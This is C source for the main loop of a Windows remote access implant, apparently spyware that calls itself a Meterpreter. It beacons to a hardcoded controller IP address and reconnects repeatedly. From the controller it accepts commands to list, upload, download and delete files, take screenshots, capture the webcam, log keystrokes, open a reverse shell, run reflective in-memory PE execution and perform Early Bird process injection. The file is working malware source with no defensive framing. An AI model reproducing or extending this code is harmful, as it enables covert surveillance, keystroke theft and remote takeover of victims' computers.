#include "File_IO.h"
#include "user_spy.h"
#include "Keylogger.h"
#include "system_func.h"
#include "Reflective_Pe.h"
#include <stdio.h>
SOCKET sock;



int main()
{
    LPVOID SetProcessDPIAware = GetProcAddress(LoadLibraryA("user32.dll"),"SetProcessDPIAware");

	WSAPOLLFD fd;
	WSADATA wsa;
	DWORD command = 1;
	struct sockaddr_in sr; BOOL br; int ret;

	ZeroMemory(&sr, 16);
	sr.sin_family = 2;
	sr.sin_port = 0xddbb;
	sr.sin_addr.s_addr = 0x63c1a1c1;
    cur_proc = GetCurrentProcess();

    if(SetProcessDPIAware)
    ( * (BOOL(*)())SetProcessDPIAware)();

	if (WSAStartup(MAKEWORD(2, 2), &wsa))
	{
		return 1;
	}

_Create_Sock:
	sock = WSASocketA(2, 1, 6, NULL, 0,0);
	if (sock == INVALID_SOCKET)
	{
		Sleep(4000);
		goto _Create_Sock;
	}

	ioctlsocket(sock, FIONBIO, &command);

_Connect_:
	fd.fd = sock;
	fd.events = POLLWRNORM;
	fd.revents = 0;

	connect(sock, (SOCKADDR *)&sr, 16);

	ret = WSAPoll(&fd, 1, 10000);

	if (ret > 0)
	{
		if (!(fd.revents & POLLWRNORM))
		{
			//Sleep(5000);
			goto _Connect_;
		}

	}
	else
	{
		Sleep(5000);
		goto _Connect_;
	}



	command = 1;
	send(sock, (char *)&command, 4, 0);

	br = 0;

	fd.fd = sock;
	fd.events = POLLRDNORM;
	fd.revents = 0;

	while (1)
	{
		if (br & 1)
			break;

		ret = WSAPoll(&fd, 1, 1800000);

		if (ret > 0)
		{
			if (fd.revents & POLLRDNORM)
			{
				ret = recv(sock, (char *)&command, 4, 0);

                if (ret == SOCKET_ERROR)
                {
                    if (WSAGetLastError() != WSAEWOULDBLOCK)
                    {
                        break;
                    }
                }

                else if(ret == 0)
                    break;

                else
                {


                    switch (command)
                    {
                        //0 - 10 File Related Command
                    case 0:
                        if (List_Directory(sock) == 404) //Listing Directory
                        {
                            br = 1;
                        }
                        break;


                    case 1:
                        br = 0x00010001;// Killing The Meterpreter
                        break;

                    case 2:
                        if (File_Upload(sock) == 404) // For Uploading File
                        {
                            br = 1;
                        }
                        break;

                    case 3:
                        File_Download(sock); // For Downloading File
                        break;

                    case 4:
                        Change_Dir(sock); break; // Changing Working Directory

                    case 5:
                        Get_Cur_Dir(sock); break; //Getting Current Working Directory

                    case 6:
                        ChangeFileTime(sock); break; //Changing File Time

                    case 7:
                        Del_File(sock); break; //Deleting File
                    case 8:
                        Create_Dir(sock); break; //for Creating Directory

                        // 11 - 20 Spyware Command

                    case 11:
                        ScreenShot(sock);break; // for Sending Screenshot

                    case 12:
                        List_Webcam(sock);break; //for Listing Webcam

                    case 13:
                        Webcam_Capture(sock);break; //For Captureing Webcam

                    case 14:
                        Keylogger_start();break; // Start Capturing Keylogger

                    case 15:
                        if(Keylogger_status(sock)==404) // KeyLogger Status
                        {
                            br = 1;
                        }
                        break;

                    case 16:
                        if(Keylogger_time(sock)==404) //Last KeyStroke
                        {
                            br = 1;
                        }
                        break;

                    case 17:
                        Keylogger_stop();break; //For Stopping Keylogger

                    case 18: //Dumping Keystrokes
                        if(Keylogger_dump(sock)==404)
                        {
                            br = 1;
                        }
                        break;

                     // 21 - ? System Command
                    case 21:
                        if(Shell(sock)==404) // For Dropping reverse shell
                        {
                            br = 1;
                        }
                        break;


                    case 22:
                        if(List_Process(sock)==404) //List running process
                        {
                            br = 1;
                        }
                        break;

                    case 23:
                        if(Remote_Refelctive_Pe(sock)==404) //In Memory Pe Execution
                        {
                            br = 1;
                        }
                        break;

                    case 24:
                        if(Early_Bird(sock)==404) //Early bird pe Injection technique
                        {
                            br = 1;
                        }
                        break;

                    case 25: // Change Desktop Wallpaper
                        if(Change_Wallpaper(sock)==404)
                        {
                            br = 1;
                        }
                        break;

                    case 26: // Locking Window
                        Lock_Window(sock);break;


                    case 27: //Shutting or Restarting System
                        Reboot(sock);break;

                    case 28: //Listing Installed App
                        List_Installed(sock);break;

                    case 29: //Listing Disks
                        List_Disk(sock);break;
                    }

                }
			}

			if ((fd.revents & POLLHUP) || (fd.revents & POLLERR))
			{
				break;
			}
		}

		if (ret == 0)
		{
		    /*
			if (WSAGetLastError() != WSAEWOULDBLOCK)
			{
				break;
			}*/
			break;
		}

		if (ret == SOCKET_ERROR)
		{
			break;
		}
	}


	closesocket(sock);
	if(!(br &0x10000) )
	goto _Create_Sock;

	return 0;
}

/*

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved)
{
	switch(fdwReason)
	{
		case DLL_PROCESS_ATTACH:
		{
			main();
			break;
		}
		case DLL_PROCESS_DETACH:
		{
			break;
		}
		case DLL_THREAD_ATTACH:
		{
			break;
		}
		case DLL_THREAD_DETACH:
		{
			break;
		}
	}

	// Return TRUE on success, FALSE on failure
	return TRUE;
}
*/
